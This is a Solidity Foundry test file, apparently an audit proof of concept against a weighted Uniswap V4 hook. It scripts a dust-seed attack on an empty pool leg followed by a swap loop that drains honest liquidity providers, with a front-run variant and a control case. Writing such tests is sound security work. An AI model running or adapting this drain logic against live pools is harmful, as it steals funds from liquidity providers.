// SPDX-License-Identifier: BSL-1.1
pragma solidity ^0.8.0;

import "forge-std/console.sol";
import {
    TestBase_UniswapV4WeightedSwapHook,
    MintableDec
} from "contracts/hooks/uniswap/v4/weighted/TestBase_UniswapV4WeightedSwapHook.sol";
import {IUniswapV4WeightedSwapHook} from "contracts/hooks/uniswap/v4/weighted/interfaces/IUniswapV4WeightedSwapHook.sol";
import {PoolKey} from "@crane/contracts/protocols/dexes/uniswap/v4/types/PoolKey.sol";
import {Currency} from "@crane/contracts/protocols/dexes/uniswap/v4/types/Currency.sol";
import {SwapParams} from "@crane/contracts/protocols/dexes/uniswap/v4/types/PoolOperation.sol";
import {TickMath} from "@crane/contracts/protocols/dexes/uniswap/v4/libraries/TickMath.sol";
import {WrapperExactOutRouter} from "contracts/test/stubs/WrapperExactOutRouter.sol";

/// Partial-book (n=3) weighted hook: honest LP funds legs A,B at fair (all prices 1).
/// Attacker seeds empty leg C with dust (permissionless joinProportional), completing the
/// book at an absurd C price, then sells C into the pool via the now-live C/A, C/B doors.
contract WeightedPartialDustSeedV2_Test is TestBase_UniswapV4WeightedSwapHook {
    WrapperExactOutRouter internal router;
    address internal attacker = address(0xA77AC);
    address hook;
    MintableDec A; MintableDec B; MintableDec C;

    function setUp() public override {
        super.setUp();
        router = new WrapperExactOutRouter(pm);
        MintableDec a = new MintableDec("A", "A", 18);
        MintableDec b = new MintableDec("B", "B", 18);
        MintableDec c = new MintableDec("C", "C", 18);
        (MintableDec t0, MintableDec t1, MintableDec t2) = _sortThree(a, b, c);
        address[] memory tokens = new address[](3);
        tokens[0] = address(t0); tokens[1] = address(t1); tokens[2] = address(t2);
        uint256[] memory w = new uint256[](3);
        w[0] = 4e17; w[1] = 3e17; w[2] = 3e17;
        address[] memory providers = new address[](3);
        (hook,) = _mineAndDeploy(tokens, w, providers);
        _fundAndApprove(hook, tokens);
        A = t0; B = t1; C = t2; // C = index 2 = weight 0.3, left empty
    }

    function _swapIn(MintableDec tin, MintableDec tout, uint256 amt) internal {
        PoolKey memory key = _poolKeyFor(address(tin), address(tout), hook);
        bool z = address(tin) == Currency.unwrap(key.currency0);
        router.swapExactIn(key, SwapParams({zeroForOne: z, amountSpecified: -int256(amt),
            sqrtPriceLimitX96: z ? TickMath.MIN_SQRT_PRICE + 1 : TickMath.MAX_SQRT_PRICE - 1}), "");
    }

    function test_dustSeedThenDrain() public {
        IUniswapV4WeightedSwapHook H = IUniswapV4WeightedSwapHook(hook);
        // honest LP: weight-proportional so all spot prices = 1 (A 4000, B 3000)
        uint256[] memory am = new uint256[](3);
        am[0] = 4000e18; am[1] = 3000e18; am[2] = 0;
        vm.prank(user);
        (uint256 vShares,) = H.joinProportional(am, user, 0, block.timestamp + 1, "");
        uint256 victimIn = 7000e18;

        // attacker: only holds C
        C.mint(attacker, 1_000e18);
        uint256 a0 = A.balanceOf(attacker) + B.balanceOf(attacker) + C.balanceOf(attacker);
        vm.startPrank(attacker);
        C.approve(hook, type(uint256).max);
        C.approve(address(router), type(uint256).max);
        uint256[] memory seed = new uint256[](3);
        seed[2] = 1e9; // dust seed
        (uint256 aShares,) = H.joinProportional(seed, attacker, 0, block.timestamp + 1, "");
        assertTrue(H.isFullBook(), "full");
        console.log("attacker seed shares", aShares, "victim shares", vShares);

        uint256 swaps;
        for (uint256 k; k < 400; ++k) {
            MintableDec tout = (k % 2 == 0) ? A : B;
            uint256 amt = (H.reserveOf(address(C)) * 29) / 100;
            if (amt == 0) break;
            uint256 out;
            try H.previewSwapExactIn(address(C), address(tout), amt) returns (uint256 o) { out = o; } catch { continue; }
            if (out <= amt) { // unprofitable at fair price for this leg; try other leg next
                MintableDec other = tout == A ? B : A;
                try H.previewSwapExactIn(address(C), address(other), amt) returns (uint256 o2) { if (o2 <= amt) break; } catch { break; }
                continue;
            }
            _swapIn(C, tout, amt);
            ++swaps;
        }
        // attacker exits its dust shares too
        uint256[] memory mins = new uint256[](3);
        H.exitProportional(aShares, attacker, mins, block.timestamp + 1);
        vm.stopPrank();
        uint256 a1 = A.balanceOf(attacker) + B.balanceOf(attacker) + C.balanceOf(attacker);
        console.log("swaps", swaps);
        console.log("attacker value before", a0);
        console.log("attacker value after ", a1);
        console.log("reserves A,B,C", H.reserveOf(address(A)), H.reserveOf(address(B)), H.reserveOf(address(C)));

        vm.prank(user);
        uint256[] memory out = H.exitProportional(vShares, user, mins, block.timestamp + 1);
        uint256 victimOut = out[0] + out[1] + out[2];
        console.log("victim in ", victimIn);
        console.log("victim out", victimOut);
        assertGt(a1, a0, "attacker profit");
        assertLt(victimOut, victimIn / 2, "victim lost >50%");
        assertGt(a1 - a0, 5000e18, "attacker net profit > 5000e18 at price 1 (all C spent counted)");
        console.log("attacker net profit", a1 - a0);
        console.log("victim loss", victimIn - victimOut);
    }

    /// control: honest seed of C at fair size -> no drain
    function test_control_fairSeed() public {
        IUniswapV4WeightedSwapHook H = IUniswapV4WeightedSwapHook(hook);
        uint256[] memory am = new uint256[](3);
        am[0] = 4000e18; am[1] = 3000e18; am[2] = 0;
        vm.prank(user);
        H.joinProportional(am, user, 0, block.timestamp + 1, "");
        C.mint(attacker, 10_000e18);
        vm.startPrank(attacker);
        C.approve(hook, type(uint256).max);
        uint256[] memory seed = new uint256[](3);
        seed[2] = 3000e18;
        H.joinProportional(seed, attacker, 0, block.timestamp + 1, "");
        uint256 out = H.previewSwapExactIn(address(C), address(A), 1e18);
        console.log("C->A 1e18 out at fair seed", out);
        vm.stopPrank();
    }

    /// Front-run variant: honest seeder previews a fair 3000e18 C seed (sharesMin = 99% of preview).
    /// Attacker front-runs with dust seed + drain. Honest seed tx then reverts (slippage) -> honest op DoS;
    /// with sharesMin=0 it would instead join the drained book.
    function test_frontrunHonestSeed() public {
        IUniswapV4WeightedSwapHook H = IUniswapV4WeightedSwapHook(hook);
        uint256[] memory am = new uint256[](3);
        am[0] = 4000e18; am[1] = 3000e18; am[2] = 0;
        vm.prank(user);
        (uint256 vShares,) = H.joinProportional(am, user, 0, block.timestamp + 1, "");
        address seeder = address(0x5EED);
        C.mint(seeder, 3000e18);
        vm.prank(seeder); C.approve(hook, type(uint256).max);
        uint256[] memory hs = new uint256[](3); hs[2] = 3000e18;
        (uint256 expShares,) = H.previewJoinProportional(hs);
        console.log("honest seeder expected shares", expShares);

        // attacker front-runs
        C.mint(attacker, 1_000e18);
        uint256 a0 = C.balanceOf(attacker);
        vm.startPrank(attacker);
        C.approve(hook, type(uint256).max);
        C.approve(address(router), type(uint256).max);
        uint256[] memory seed = new uint256[](3); seed[2] = 1e9;
        (uint256 aShares,) = H.joinProportional(seed, attacker, 0, block.timestamp + 1, "");
        for (uint256 k; k < 400; ++k) {
            MintableDec tout = (k % 2 == 0) ? A : B;
            uint256 amt = (H.reserveOf(address(C)) * 29) / 100;
            if (amt == 0) break;
            uint256 out;
            try H.previewSwapExactIn(address(C), address(tout), amt) returns (uint256 o) { out = o; } catch { continue; }
            if (out <= amt) {
                MintableDec other = tout == A ? B : A;
                try H.previewSwapExactIn(address(C), address(other), amt) returns (uint256 o2) { if (o2 <= amt) break; } catch { break; }
                continue;
            }
            _swapIn(C, tout, amt);
        }
        uint256[] memory mins = new uint256[](3);
        H.exitProportional(aShares, attacker, mins, block.timestamp + 1);
        vm.stopPrank();
        uint256 a1 = A.balanceOf(attacker) + B.balanceOf(attacker) + C.balanceOf(attacker);
        console.log("attacker net profit (fr)", a1 - a0);

        // honest seeder's tx lands after
        vm.prank(seeder);
        try H.joinProportional(hs, seeder, (expShares * 99) / 100, block.timestamp + 1, "") returns (uint256 got, uint256[] memory) {
            console.log("honest seed got shares", got);
        } catch {
            console.log("honest seed tx reverted (slippage) - honest op DoS");
        }
        vm.prank(user);
        uint256[] memory out2 = H.exitProportional(vShares, user, mins, block.timestamp + 1);
        console.log("victim LP out", out2[0] + out2[1] + out2[2]);
        assertGt(a1, a0 + 5000e18, "frontrun profit");
        assertLt(out2[0] + out2[1] + out2[2], 3500e18, "victim lost >50%");
    }
}
